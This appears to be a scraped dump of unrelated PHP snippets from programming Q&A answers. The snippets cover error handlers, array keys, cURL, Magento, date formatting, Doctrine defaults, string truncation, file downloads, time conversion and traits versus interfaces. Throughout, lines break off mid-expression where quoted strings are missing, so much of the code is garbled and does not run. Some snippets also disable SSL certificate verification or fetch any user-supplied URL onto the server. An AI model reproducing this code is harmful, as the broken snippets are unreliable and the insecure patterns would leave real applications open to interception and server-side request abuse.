set_error_handler("warning_handler", E_WARNING); dns_get_record(...) restore_error_handler(); function warning_handler($errno, $errstr) { }
bob@mypc:~$ php -a Interactive shell php > echo @something();
bob@mypc:~$ php -a Interactive shell php > echo something(); PHP Fatal error: Call to undefined function something() in php shell code on line 1 PHP Stack trace: PHP 1. {main}() php shell code:0 bob@mypc:~$
function throwErrorException($errstr = null,$code = null, $errno = null, $errfile = null, $errline = null) { throw new ErrorException($errstr, 0, $errno, $errfile, $errline); } function warning_handler($errno, $errstr, $errfile, $errline, array $errcontext) { return false && throwErrorException($errstr, 0, $errno, $errfile, $errline); } ... set_error_handler( ... try { mkdir($path, 0777, true); } catch (Exception $e) { echo $e->getMessage(); }
set_error_handler(function ($err_severity, $err_msg, $err_file, $err_line, array $err_context) { throw new ErrorException( $err_msg, 0, $err_severity, $err_file, $err_line ); }, E_WARNING); try { $iResult = file_get_contents($sUrl); } catch (Exception $e) { $this->sErrorMsg = $e->getMessage(); } restore_error_handler();
public function myContentGetter($sUrl) { ... code above ... return $iResult; }
ex. oci_parse($res, "[oracle pl/sql]"); if(oci_execute){ ...do something }
<?php $pass = isset($_GET[ if ( strcasecmp( $pass, echo } ?>
$first_string = "aabo"; $second_string = "aaao"; echo $n = strcmp($first_string,$second_string);
$array = array( ); end($array); $key = key($array); var_dump($key);
$last_key = key( array_slice( $array, -1, 1, TRUE ) );
$array = array( ); $keys = array_keys($array); $last = end($keys);
<?php $array = array( ); echo array_pop(array_keys($array)); ?>
$array = array(0=> $lastKey = count($array)-1; $lastKeyValue = $array[$lastKey]; var_dump($lastKey); print_r($lastKeyValue);
$array = array("one" => "apple", "two" => "orange", "three" => "pear"); end($array); echo key($array);
function endKey($array){ end($array); return key($array); } $array = array("one" => "apple", "two" => "orange", "three" => "pear"); echo endKey($array);
function last($array){ $keys = array_keys($array); return end($keys); } $arr = array("one" => "apple", "two" => "orange", "three" => "pear"); echo last($arr); echo $arr(last($arr));
$array = ["a" => "one", "b" => "two", "c" => "three"]; if (!function_exists( echo "please upgrade to php7.3"; } else { echo "First Key: " , key($array) , "\n"; echo "Last Key: " , array_key_last($array) , "\n"; next($array); echo "Second Key: " , key($array) , "\n"; echo "Still Last Key: " , array_key_last($array); }
$arr = array( list($last_key) = each(array_reverse($arr)); print $last_key;
$array = array( ); $last_value = end($array); $last_key = key($array);
if (!isset($res)) $res = new stdClass(); $res->success = false;
$res->success = !!0; $res->success = false; $res->success = (bool)0;
@$unknownVar[$someStringVariable]->totalcall += 10; $unknownVar[$someStringVariable]->totalcall += 10; echo $unknownVar[$someStringVariable]->totalcall;
$product_details = array(); foreach ($products_in_store as $key => $objects) { $product_details[$key] = new stdClass(); $product_details[$key]->product_id = $objects->id; }
if (!isset($res) || !is_object($res)) { $res = new \stdClass(); $res = new class implements MyInterface {}; $res = new class extends MyClass {}; } $res->success = true;
class test { } $res = new test(); $res->success = false;
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http: curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,$vars); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $headers = [ ]; curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); $server_output = curl_exec ($ch); curl_close ($ch); print $server_output ;
/** * * @param string $url * @param string|array $post_fields * @param array $headers * @return type */ function cUrlGetData($url, $post_fields = null, $headers = null) { $ch = curl_init(); $timeout = 5; curl_setopt($ch, CURLOPT_URL, $url); if ($post_fields && !empty($post_fields)) { curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); } if ($headers && !empty($headers)) { curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); } curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); $data = curl_exec($ch); if (curl_errno($ch)) { echo } curl_close($ch); return $data; }
$url = "http: $post_fields = $headers = [ $dat = cUrlGetData($url, $post_fields, $headers);
$subscription_key = $host = $request_headers = array( "X-Mashape-Key:" . $subscription_key, "X-Mashape-Host:" . $host ); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers); $season_data = curl_exec($ch); if (curl_errno($ch)) { print "Error: " . curl_error($ch); exit(); } curl_close($ch); $json= json_decode($season_data, true);
<?php class MyCompanyName_HelloWorld_IndexController extends Mage_Core_Controller_Front_Action{ public function indexAction(){ echo "We } }
<?php class MyCompanyName_HelloWorld_FooController extends Mage_Core_Controller_Front_Action{ public function indexAction(){ echo } public function addAction(){ echo } public function deleteAction(){ echo } }
?php \Magento\Framework\Component\ComponentRegistrar::register( \Magento\Framework\Component\ComponentRegistrar::MODULE, __DIR__ );
php bin/magento module:status php bin/magento module:enable Cloudways_Mymodule
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
mysql_query("SET NAMES utf8"); meta charset="utf-8" header php.(before any output of the HTML): header( table-rows-charset(for each row): utf8_unicode_ci
$old_date = date( $middle = strtotime($old_date); $new_date = date(
$old_date = date( $old_date_timestamp = strtotime($old_date); $new_date = date(
$myDateTime = DateTime::createFromFormat( $newDateString = $myDateTime->format(
$date = new DateTime( $new_date_format = $date->format(
$date = new DateTime( $new_date_format = $date->format(
$date = new DateTime( $timestamp = $date->getTimestamp();
$date = DateTime::createFromFormat( $new_date_format = $date->format(
$new_date_format = (new DateTime( $new_date_format = DateTime::createFromFormat(
$old_date = date( preg_match_all( $out = $out[0]; $time = mktime($out[4], $out[5], $out[6], $out[2], $out[3], $out[1]); $new_date = date(
$old_date = date( $out = explode( $time = mktime($out[3], $out[4], $out[5], $out[1], $out[2], $out[0]); $new_date = date(
$date = DateTime::createFromFormat( echo $date->format( echo $date->format( echo $date->format(
<?php $e1 = strtotime("2013-07-22T12:00:03Z"); echo date( echo "2013-07-22T12:00:03Z"; $e2 = strtotime("2013-07-23T18:18:15Z"); echo date ( echo "2013-07-23T18:18:15Z"; $e1 = strtotime("2013-07-21T23:57:04Z"); echo date ( echo "2013-07-21T23:57:04Z"; ?>
$formatInput = $dateInput = $formatOut = $dateOut = DateTime::createFromFormat($formatInput, $dateInput)->format($formatOut);
<?php $pastDate = "Tuesday 11th October, 2016"; $pastDate = str_replace(",","",$pastDate); $date = new DateTime($pastDate); $new_date_format = $date->format( echo $new_date_format.
class dateTranslator { public static function translate($date, $lang) { $divider = if (empty($date)){ return null; } if (strpos($date, $divider = } else if (strpos($date, $divider = } if (strcmp($lang, $type = explode($divider, $date)[0]; if (strlen($type) == 4) { $date = self::reverseDate($date,$divider); } if (strcmp($divider, $date = str_replace("-", "/", $date); } } else { $type = explode($divider, $date)[0]; if (strlen($type) == 2) { $date = self::reverseDate($date,$divider); } if (strcmp($divider, $date = str_replace("/", "-", $date); } } return $date; } public static function reverseDate($date) { $date2 = explode( if (count($date2) == 2) { $date = implode("-", array_reverse(preg_split("/\D/", $date2[0]))) . } else { $date = implode("-", array_reverse(preg_split("/\D/", $date))); } return $date; }
<?php /** * @Entity */ class myEntity { /** * @var string * * @Column(name="myColumn", type="string", length="50") */ private $myColumn = ... }
<?php /** * @Entity */ class myEntity { /** * @var string * * @ORM\Column(name="myColumn", type="integer", options={"default" : 0}) */ private $myColumn; ... }
/** * @ORM\Column(name="foo", type="smallint", options={"default":0}) */ private $foo
<?php /** * @Entity */ class myEntity { /** * @var string * * @Column(name="myColumn", type="string", length="50") */ private $myColumn = ... }
@ORM\Column(name="foo", options={"default":"foo bar"})
/** * @Entity */ class myEntity { ... public function __construct() { $this->myColumn = } ... }
... if ($myEntity->getMyColumn() === null) { $myEntity->setMyColumn( } ...
... /** * Set myColumn * * @param string $myColumn * * @return myEntity */ public function setMyColumn($myColumn) { $this->myColumn = ($myColumn === null || $myColumn === return $this; } ...
/** * @Entity @Table(name="posts") @HasLifeCycleCallbacks */ class Post implements Node, \Zend_Acl_Resource_Interface { ... /** * @PrePersist */ function onPrePersist() { $this->dtPosted = date( }
<field name="acmeOne" type="string" column="acmeOne" length="36"> <options> <option name="comment">Your SQL field comment goes here.</option> <option name="default">Default Value</option> </options> </field>
Entity\Entity_name: type: entity table: table_name fields: field_name: type: integer nullable: true options: default: 1
Entity\Example: type: entity table: example fields: id: type: integer id: true generator: strategy: AUTO label: type: string columnDefinition: varchar(255) NOT NULL DEFAULT
Entity\Entity_name: type: entity table: table_name fields: field_name: type: boolean nullable: false options: default: false
$this->abortIf($this->connection->getDatabasePlatform()->getName() != "postgresql"); $this->addSql("ALTER TABLE tablename ADD property BOOLEAN"); $object = new Object(); $defaultValue = $menuItem->getProperty() ? "true":"false"; $this->addSql("UPDATE tablename SET property = {$defaultValue}"); $this->addSql("ALTER TABLE tablename ALTER property SET NOT NULL");
<?php /** * Created by JetBrains PhpStorm. * User: Steffen * Date: 27-6-13 * Time: 15:36 * To change this template use File | Settings | File Templates. */ require_once $em->getConfiguration()->setMetadataDriverImpl( new \Doctrine\ORM\Mapping\Driver\DatabaseDriver( $em->getConnection()->getSchemaManager() ) ); $driver = new \Doctrine\ORM\Mapping\Driver\DatabaseDriver($em->getConnection()->getSchemaManager()); $driver->setNamespace( $em->getConfiguration()->setMetadataDriverImpl($driver); $cmf = new \Doctrine\ORM\Tools\DisconnectedClassMetadataFactory(); $cmf->setEntityManager($em); $metadata = $cmf->getAllMetadata(); foreach ($metadata as $k => $t) { foreach ($t->getFieldNames() as $fieldName) { $correctFieldName = \Doctrine\Common\Util\Inflector::tableize($fieldName); $columns = $tan = $em->getConnection()->getSchemaManager()->listTableColumns($t->getTableName()); foreach ($columns as $column) { if ($column->getName() == $correctFieldName) { if ($column->getType() != { $metadata[$k]->fieldMappings[$fieldName][ } break; } } } } $entityGenerator = new \Doctrine\ORM\Tools\EntityGenerator(); $entityGenerator->setGenerateAnnotations(true); $entityGenerator->setGenerateStubMethods(true); $entityGenerator->setRegenerateEntityIfExists(true); $entityGenerator->setUpdateEntityIfExists(false); $entityGenerator->generate($metadata, __DIR__); echo "Entities created";
$prime_array = array( 2, 3, 5, 7, 11, 13, .... 104729, ... ); $result_array = array(); foreach( $prime_array => $number ) { $result_array[$number] = in_array( $number, $large_prime_array ); } $prime_array => array( 2 => NULL, 3 => NULL, 5 => NULL, 7 => NULL, 11 => NULL, 13 => NULL, .... 104729 => NULL, ... ); foreach( $prime_array => $number ) { $result_array[$number] = array_key_exists( $number, $large_prime_array ); }
$tests = 1000000; $max = 5000001; for( $i = 1; $i <= $max; $i += 10000 ) { $array = array_fill( 0, $i, NULL ); $test_indexes = array(); for( $j = 0; $j < $tests; $j++ ) { $test_indexes[] = rand( 0, $i-1 ); } $start = microtime( TRUE ); foreach( $test_indexes as $test_index ) { $value = $array[ $test_index ]; unset( $value ); } $stop = microtime( TRUE ); unset( $array, $test_indexes, $test_index ); printf( "%d,%1.15f\n", $i, $stop - $start ); unset( $stop, $start ); }
$search_array = array( isset($search_array[ array_key_exists(
<?php $bigArray = range(1,100000); $iterations = 1000000; $start = microtime(true); while ($iterations--) { isset($bigArray[50000]); } echo $iterations = 1000000; $start = microtime(true); while ($iterations--) { array_key_exists(50000, $bigArray); } echo ?>
$string = (strlen($string) > 13) ? substr($string,0,10).
function truncate($string, $length, $dots = "...") { return (strlen($string) > $length) ? substr($string, 0, $length - strlen($dots)) . $dots : $string; }
function truncate($string,$length=100,$append="&hellip;") { $string = trim($string); if(strlen($string) > $length) { $string = wordwrap($string, $length); $string = explode("\n", $string, 2); $string = $string[0] . $append; } return $string; }
$charset = $length = 10; $string = if(mb_strlen($string, $charset) > $length) { $string = mb_substr($string, 0, $length - 3, $charset) . }
class Fun { public function limit_text($text, $len) { if (strlen($text) < $len) { return $text; } $text_words = explode( $out = null; foreach ($text_words as $word) { if ((strlen($word) > $len) && $out == null) { return substr($word, 0, $len) . "..."; } if ((strlen($out) + strlen($word)) > $len) { return $out . "..."; } $out.=" " . $word; } return $out; } }
if ( ! function_exists( { function word_limiter($str, $limit = 100, $end_char = { if (trim($str) == { return $str; } preg_match( if (strlen($str) == strlen($matches[0])) { $end_char = } return rtrim($matches[0]).$end_char; } }
if ( ! function_exists( { function character_limiter($str, $n = 500, $end_char = { if (strlen($str) < $n) { return $str; } $str = preg_replace("/\s+/", if (strlen($str) <= $n) { return $str; } $out = ""; foreach (explode( { $out .= $val. if (strlen($out) >= $n) { $out = trim($out); return (strlen($out) == strlen($str)) ? $out : $out.$end_char; } } } }
function ellipse($str,$n_chars,$crop_str= { $buff=strip_tags($str); if(strlen($buff) > $n_chars) { $cut_index=strpos($buff, $buff=substr($buff,0,($cut_index===false? $n_chars: $cut_index+1)).$crop_str; } return $buff; }
if(strlen($text) > 10) $text = substr($text,0,10) . "...";
function cutAfter($string, $len = 30, $append = return (strlen($string) > $len) ? substr($string, 0, $len - strlen($append)) . $append : $string; }
function cutat($num, $tt){ if (mb_strlen($tt)>$num){ $tt=mb_substr($tt,0,$num-2). } return $tt; }
function str_short($string,$limit) { $len=strlen($string); if($len>$limit) { $to_sub=$len-$limit; $crop_temp=substr($string,0,-$to_sub); return $crop_len=$crop_temp."..."; } else { return $string; } }
function string_length_cutoff($string, $limit, $subtext = { return (strlen($string) > $limit) ? substr($string, 0, ($limit-strlen(subtext))).$subtext : $string; } echo string_length_cutoff( echo string_length_cutoff(
print limit($string); function limit($var, $limit=10) { if ( strlen($var) > $limit ) { return substr($string, 0, $limit) . } else { return $var; } }
$result = current(explode("\n", wordwrap($str, $width, "...\n")));
$str = $max = 7; if(strlen($str) > $max) { $str = substr($str, 0, $max) . }
function cut_string($str, $n_chars, $crop_str = $buff = strip_tags($str); if (mb_strlen($buff) > $n_chars) { $cut_index = mb_strpos($buff, $buff = mb_substr($buff, 0, ($cut_index === false ? $n_chars : $cut_index + 1), "UTF-8") . $crop_str; } return $buff; }
$yourString = "bla blaaa bla blllla bla bla"; $out = ""; if(strlen($yourString) > 22) { while(strlen($yourString) > 22) { $pos = strrpos($yourString, " "); if($pos !== false && $pos <= 22) { $out = substr($yourString,0,$pos); break; } else { $yourString = substr($yourString,0,$pos); continue; } } } else { $out = $yourString; } echo "Output String: ".$out;
file_put_contents("Tmpfile.zip", file_get_contents("http:
private function downloadFile($url, $path) { $newfname = $path; $file = fopen ($url, if ($file) { $newf = fopen ($newfname, if ($newf) { while(!feof($file)) { fwrite($newf, fread($file, 1024 * 8), 1024 * 8); } } } if ($file) { fclose($file); } if ($newf) { fclose($newf); } }
set_time_limit(0); $options = array( CURLOPT_FILE => CURLOPT_TIMEOUT => 28800, CURLOPT_URL => ); $ch = curl_init(); curl_setopt_array($ch, $options); curl_exec($ch); curl_close($ch);
<html> <form method="post"> <input name="url" size="50" /> <input name="submit" type="submit" /> </form> <?php set_time_limit (24 * 60 * 60); if (!isset($_POST[ $destination_folder = $url = $_POST[ $newfname = $destination_folder . basename($url); $file = fopen ($url, "rb"); if ($file) { $newf = fopen ($newfname, "wb"); if ($newf) while(!feof($file)) { fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 ); } } if ($file) { fclose($file); } if ($newf) { fclose($newf); } ?> </html>
function downloadUrlToFile($url, $outFileName) { if(is_file($url)) { copy($url, $outFileName); } else { $options = array( CURLOPT_FILE => fopen($outFileName, CURLOPT_TIMEOUT => 28800, CURLOPT_URL => $url ); $ch = curl_init(); curl_setopt_array($ch, $options); curl_exec($ch); curl_close($ch); } }
set_time_limit(0); $file = file_get_contents( file_put_contents(
function cURLcheckBasicFunctions() { if( !function_exists("curl_init") && !function_exists("curl_setopt") && !function_exists("curl_exec") && !function_exists("curl_close") ) return false; else return true; } /* * Returns string status information. * Can be changed to int or bool return types. */ function cURLdownload($url, $file) { if( !cURLcheckBasicFunctions() ) return "UNAVAILABLE: cURL Basic Functions"; $ch = curl_init(); if($ch) { $fp = fopen($file, "w"); if($fp) { if( !curl_setopt($ch, CURLOPT_URL, $url) ) { fclose($fp); curl_close($ch); return "FAIL: curl_setopt(CURLOPT_URL)"; } if ((!ini_get( curl_setopt($ch, CURLOPT_USERAGENT, curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if( !curl_setopt($ch, CURLOPT_HEADER, $curlopt_header)) return "FAIL: curl_setopt(CURLOPT_HEADER)"; if( !curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $redirects > 0)) return "FAIL: curl_setopt(CURLOPT_FOLLOWLOCATION)"; if( !curl_setopt($ch, CURLOPT_FILE, $fp) ) return "FAIL: curl_setopt(CURLOPT_FILE)"; if( !curl_setopt($ch, CURLOPT_MAXREDIRS, $redirects) ) return "FAIL: curl_setopt(CURLOPT_MAXREDIRS)"; return curl_exec($ch); } else { curl_setopt($ch, CURLOPT_USERAGENT, curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if( !curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false)) return "FAIL: curl_setopt(CURLOPT_FOLLOWLOCATION)"; if( !curl_setopt($ch, CURLOPT_FILE, $fp) ) return "FAIL: curl_setopt(CURLOPT_FILE)"; if( !curl_setopt($ch, CURLOPT_HEADER, true)) return "FAIL: curl_setopt(CURLOPT_HEADER)"; if( !curl_setopt($ch, CURLOPT_RETURNTRANSFER, true)) return "FAIL: curl_setopt(CURLOPT_RETURNTRANSFER)"; if( !curl_setopt($ch, CURLOPT_FORBID_REUSE, false)) return "FAIL: curl_setopt(CURLOPT_FORBID_REUSE)"; curl_setopt($ch, CURLOPT_USERAGENT, } if( !curl_exec($ch) ) return "FAIL: curl_exec()"; curl_close($ch); fclose($fp); return "SUCCESS: $file [$url]"; } else return "FAIL: fopen()"; } else return "FAIL: curl_init()"; }
<?php $init = 685; $hours = floor($init / 3600); $minutes = floor(($init / 60) % 60); $seconds = $init % 60; echo "$hours:$minutes:$seconds"; ?>
function format_time($t,$f= { return sprintf("%02d%s%02d%s%02d", floor($t/3600), $f, ($t/60)%60, $f, $t%60); } echo format_time(685);
$seconds = 8525; $H = floor($seconds / 3600); $i = ($seconds / 60) % 60; $s = $seconds % 60; echo sprintf("%02d:%02d:%02d", $H, $i, $s);
$seconds = 8525; $zero = new DateTime("@0"); $offset = new DateTime("@$seconds"); $diff = $zero->diff($offset); echo sprintf("%02d:%02d:%02d", $diff->days * 24 + $diff->h, $diff->i, $diff->s);
echo floor($seconds / 3600) . gmdate(":i:s", $seconds % 3600);
$time = 111031; $days = floor($time / (60 * 60 * 24)); $time -= $days * (60 * 60 * 24); $hours = floor($time / (60 * 60)); $time -= $hours * (60 * 60); $minutes = floor($time / 60); $time -= $minutes * 60; $seconds = floor($time); $time -= $seconds; echo "{$days}d {$hours}h {$minutes}m {$seconds}s";
$seconds= -24*60*60 - 2*60*60 - 3*60 - 4; echo sprintf("%s:%
function secondsToTime($seconds) { $hours = floor($seconds / (60 * 60)); $divisor_for_minutes = $seconds % (60 * 60); $minutes = floor($divisor_for_minutes / 60); $divisor_for_seconds = $divisor_for_minutes % 60; $seconds = ceil($divisor_for_seconds); $obj = array( "h" => (int) $hours, "m" => (int) $minutes, "s" => (int) $seconds, ); return $obj; }
/** * Convert number of seconds into hours, minutes and seconds * and return an array containing those values * * @param integer $inputSeconds Number of seconds to parse * @return array */ function secondsToTime($inputSeconds) { $secondsInAMinute = 60; $secondsInAnHour = 60 * $secondsInAMinute; $secondsInADay = 24 * $secondsInAnHour; $days = floor($inputSeconds / $secondsInADay); $hourSeconds = $inputSeconds % $secondsInADay; $hours = floor($hourSeconds / $secondsInAnHour); $minuteSeconds = $hourSeconds % $secondsInAnHour; $minutes = floor($minuteSeconds / $secondsInAMinute); $remainingSeconds = $minuteSeconds % $secondsInAMinute; $seconds = ceil($remainingSeconds); $obj = array( ); return $obj; }
Convert seconds to format by $seconds = 8525; $H = floor($seconds / 3600); $i = ($seconds / 60) % 60; $s = $seconds % 60; echo sprintf("%02d:%02d:%02d", $H, $i, $s);
function formatSeconds($seconds) { if(!is_integer($seconds)) { return FALSE; } $fmt = ""; $days = floor($seconds / 86400); if($days) { $fmt .= $days."D "; $seconds %= 86400; } $hours = floor($seconds / 3600); if($hours) { $fmt .= str_pad($hours, 2, $seconds %= 3600; } $mins = floor($seconds / 60 ); if($mins) { $fmt .= str_pad($mins, 2, $seconds %= 60; } $fmt .= str_pad($seconds, 2, return $fmt;}
function secondsToTime($seconds_time) { if ($seconds_time < 24 * 60 * 60) { return gmdate( } else { $hours = floor($seconds_time / 3600); $minutes = floor(($seconds_time - $hours * 3600) / 60); $seconds = floor($seconds_time - ($hours * 3600) - ($minutes * 60)); return "$hours:$minutes:$seconds"; } } secondsToTime(108620);
$time = 60; $now = time(); $rep = new DateTime( $diff = new DateTime( $return = $diff->diff($rep)->format($format);
$duration = 1; $converted = [ ]; $result = ltrim( sprintf( if( $result ==
$duration = 1; $result = ltrim( sprintf( if( $result ==
$duration = -493; $wasNegative = FALSE; if( $duration < 0 ) { $wasNegative = TRUE; $duration = abs( $duration ); } $converted = [ ]; $result = ltrim( sprintf( if( $result == if( $wasNegative ) { $result = "-{$result}"; }
function timeToSecond($time){ $time_parts=explode(":",$time); $seconds= ($time_parts[0]*86400) + ($time_parts[1]*3600) + ($time_parts[2]*60) + $time_parts[3] ; return $seconds; } function secondToTime($time){ $seconds = $time % 60; $seconds<10 ? "0".$seconds : $seconds; if($seconds<10) { $seconds="0".$seconds; } $time = ($time - $seconds) / 60; $minutes = $time % 60; if($minutes<10) { $minutes="0".$minutes; } $time = ($time - $minutes) / 60; $hours = $time % 24; if($hours<10) { $hours="0".$hours; } $days = ($time - $hours) / 24; if($days<10) { $days="0".$days; } $time_arr = array($days,$hours,$minutes,$seconds); return implode(":",$time_arr); }
function formatSeconds($seconds) { $hours = 0;$minutes = 0; while($seconds >= 60){$seconds -= 60;$minutes++;} while($minutes >= 60){$minutes -=60;$hours++;} $hours = str_pad($hours, 2, $minutes = str_pad($minutes, 2, $seconds = str_pad($seconds, 2, return $hours.":".$minutes.":".$seconds; }
$given = 685; /* * In case $given == 86400, gmdate( "H" ) will convert it into * We would need to take this into consideration, and so we will first * check the ratio of the seconds i.e. $given:$number_of_sec_in_a_day * and then after multiplying it by the number of hours in a day (24), we * will just use "floor" to get the number of hours as the rest would * be the minutes and seconds anyways. * * We can also have minutes and seconds combined in one variable, * e.g. $min_sec = gmdate( "i:s", $given ); * But for versatility sake, I have taken them separately. */ $hours = ( $given > 86399 ) ? $min = gmdate( "i", $given ); $sec = gmdate( "s", $given ); echo $formatted_string = $hours.
function getHoursFormat( $given ){ $hours = ( $given > 86399 ) ? $min = gmdate( "i", $given ); $sec = gmdate( "s", $given ); $formatted_string = $hours. return $formatted_string; }
function format_timer_result($time_in_seconds){ $time_in_seconds = ceil($time_in_seconds); if ($time_in_seconds == 0){ return } $days = floor($time_in_seconds / (60 * 60 * 24)); $time_in_seconds -= $days * (60 * 60 * 24); $hours = floor($time_in_seconds / (60 * 60)); $time_in_seconds -= $hours * (60 * 60); $minutes = floor($time_in_seconds / 60); $time_in_seconds -= $minutes * 60; $seconds = floor($time_in_seconds); $return = if ($days > 0){ $return .= $days . } if ($hours > 0){ $return .= $hours . } if ($minutes > 0){ $return .= $minutes . } if ($seconds > 0){ $return .= $seconds . } $return = trim($return); return $return; }
$init = 685; $hours = floor($init / 3600); $hrlength=strlen($hours); if ($hrlength==1) {$hrs="0".$hours;} else {$hrs=$hours;} $minutes = floor(($init / 60) % 60); $minlength=strlen($minutes); if ($minlength==1) {$mins="0".$minutes;} else {$mins=$minutes;} $seconds = $init % 60; $seclength=strlen($seconds); if ($seclength==1) {$secs="0".$seconds;} else {$secs=$seconds;} echo "$hrs:$mins:$secs";
<?php $time=3*3600 + 30*60; $year=floor($time/(365*24*60*60)); $time-=$year*(365*24*60*60); $month=floor($time/(30*24*60*60)); $time-=$month*(30*24*60*60); $day=floor($time/(24*60*60)); $time-=$day*(24*60*60); $hour=floor($time/(60*60)); $time-=$hour*(60*60); $minute=floor($time/(60)); $time-=$minute*(60); $second=floor($time); $time-=$second; if($year>0){ echo $year." year, "; } if($month>0){ echo $month." month, "; } if($day>0){ echo $day." day, "; } if($hour>0){ echo $hour." hour, "; } if($minute>0){ echo $minute." minute, "; } if($second>0){ echo $second." second, "; }
class ApcCacher { public function fetch($key) { return apc_fetch($key); } public function store($key, $data) { return apc_store($key, $data); } public function delete($key) { return apc_delete($key); } }
class Controller { protected $req; protected $resp; protected $cacher; public function __construct(Request $req, Response $resp, ApcCacher $cacher=NULL) { $this->req = $req; $this->resp = $resp; $this->cacher = $cacher; $this->buildResponse(); } public function buildResponse() { if (NULL !== $this->cacher && $response = $this->cacher->fetch($this->req->uri()) { $this->resp = $response; } else { } } public function getResponse() { return $this->resp; } }
public function __construct(Request $req, Response $resp, CacherInterface $cacher=NULL)
interface CacherInterface { public function fetch($key); public function store($key, $data); public function delete($key); }
interface Person { public function greet(); public function eat($food); } trait EatingTrait { public function eat($food) { $this->putInMouth($food); } private function putInMouth($food) { } } class NicePerson implements Person { use EatingTrait; public function greet() { echo } } class MeanPerson implements Person { use EatingTrait; public function greet() { echo } }
trait myTrait { function foo() { return "Foo!"; } function bar() { return "Bar!"; } }
class MyClass extends SomeBaseClass { use myTrait; }
----------------------------------------------- | Interface | Base Class | Trait | =============================================== > 1 per class | Yes | No | Yes | --------------------------------------------------------------------- Define Method Body | No | Yes | Yes | --------------------------------------------------------------------- Polymorphism | Yes | Yes | No | ---------------------------------------------------------------------
class BaseClass { function SomeMethod() { } } interface IBase { function SomeMethod(); } trait myTrait { function SomeMethod() { } } class MyClass extends BaseClass implements IBase { use myTrait; function SomeMethod() { } }
trait ToolKit { public $errors = array(); public function error($msg) { $this->errors[] = $msg; return false; } }
class Something { use Toolkit; public function do_something($zipcode) { if (preg_match( return $this->error( } }
trait SayWorld { public function sayHello() { echo } }
class MyClass{ use SayWorld; } $o = new MyClass(); $o->sayHello();
interface SayWorld { public function sayHello(); } class MyClass implements SayWorld { public function sayHello() { echo } }
class SlidingDoor extends Door implements IKeyed { use KeyedTrait; [...] }
interface Observable { function addEventListener($eventName, callable $listener); function removeEventListener($eventName, callable $listener); function removeAllEventListeners($eventName); }
$auction = new Auction(); $auction->addEventListener( echo "Got a bid of $bidAmount from $bidderName\n"; }); foreach ([ $auction->addBid($name, rand()); }
class EventEmitter { private $eventListenersByName = []; function addEventListener($eventName, callable $listener) { $this->eventListenersByName[$eventName][] = $listener; } function removeEventListener($eventName, callable $listener) { $this->eventListenersByName[$eventName] = array_filter($this->eventListenersByName[$eventName], function($existingListener) use ($listener) { return $existingListener === $listener; }); } function removeAllEventListeners($eventName) { $this->eventListenersByName[$eventName] = []; } function triggerEvent($eventName, array $eventArgs) { foreach ($this->eventListenersByName[$eventName] as $listener) { call_user_func_array($listener, $eventArgs); } } } class Auction implements Observable { private $eventEmitter; public function __construct() { $this->eventEmitter = new EventEmitter(); } function addBid($bidderName, $bidAmount) { $this->eventEmitter->triggerEvent( } function addEventListener($eventName, callable $listener) { $this->eventEmitter->addEventListener($eventName, $listener); } function removeEventListener($eventName, callable $listener) { $this->eventEmitter->removeEventListener($eventName, $listener); } function removeAllEventListeners($eventName) { $this->eventEmitter->removeAllEventListeners($eventName); } }
trait EventEmitterTrait { private $eventListenersByName = []; function addEventListener($eventName, callable $listener) { $this->eventListenersByName[$eventName][] = $listener; } function removeEventListener($eventName, callable $listener) { $this->eventListenersByName[$eventName] = array_filter($this->eventListenersByName[$eventName], function($existingListener) use ($listener) { return $existingListener === $listener; }); } function removeAllEventListeners($eventName) { $this->eventListenersByName[$eventName] = []; } protected function triggerEvent($eventName, array $eventArgs) { foreach ($this->eventListenersByName[$eventName] as $listener) { call_user_func_array($listener, $eventArgs); } } } class Auction implements Observable { use EventEmitterTrait; function addBid($bidderName, $bidAmount) { $this->triggerEvent( } }
+----------------+-----------------+----------------+----------------+ | Command | Displays Output | Can Get Output | Gets Exit Code | +----------------+-----------------+----------------+----------------+ | system() | Yes (as text) | Last line only | Yes | | passthru() | Yes (raw) | No | Yes | | exec() | No | Yes (array) | Yes | | shell_exec() | No | Yes (string) | No | | backticks (``) | No | Yes (string) | No | +----------------+-----------------+----------------+----------------+
<?php class Fruit { private $color; public function eat() { } public function setColor($c) { $this->color = $c; } } class Apple extends Fruit { public function eat() { } } class Orange extends Fruit { public function eat() { } }
<?php $apple = new Apple(); $apple->eat(); $fruit = new Fruit(); $fruit->eat();
<?php abstract class Fruit { private $color; abstract public function eat(){} public function setColor($c) { $this->color = $c; } } ?>
<?php abstract class person { public $LastName; public $FirstName; public $BirthDate; abstract protected function write_info(); } final class employee extends person{ public $EmployeeNumber; public $DateHired; public function write_info(){ echo "Writing ". $this->LastName . " } } final class student extends person{ public $StudentNumber; public $CourseName; public function write_info(){ echo "Writing ". $this->LastName . " } } $personA = new employee; $personB = new student; $personA->FirstName="Joe"; $personA->LastName="Sbody"; $personB->FirstName="Ben"; $personB->LastName="Dover"; $personA->write_info(); $personB->write_info();
<?php class parser implements parserDecoratorPattern { }
<?php interface TelevisionControls {}; class Remote implements TelevisionControls {}; class Spouse implements TelevisionControls {}; Spouse spouse = new Spouse(); Remote remote = new Remote(); isSameType = (bool)(remote == spouse)
class SubClass extends ParentClass implements Interface1, Interface2 { }
<?php class X implements Y { } class X extends Y { } ?>
abstract class ClassToBuildUpon { public function doSomething() { echo } }
interface ClassToBuildUpon { public function doSomething(); }
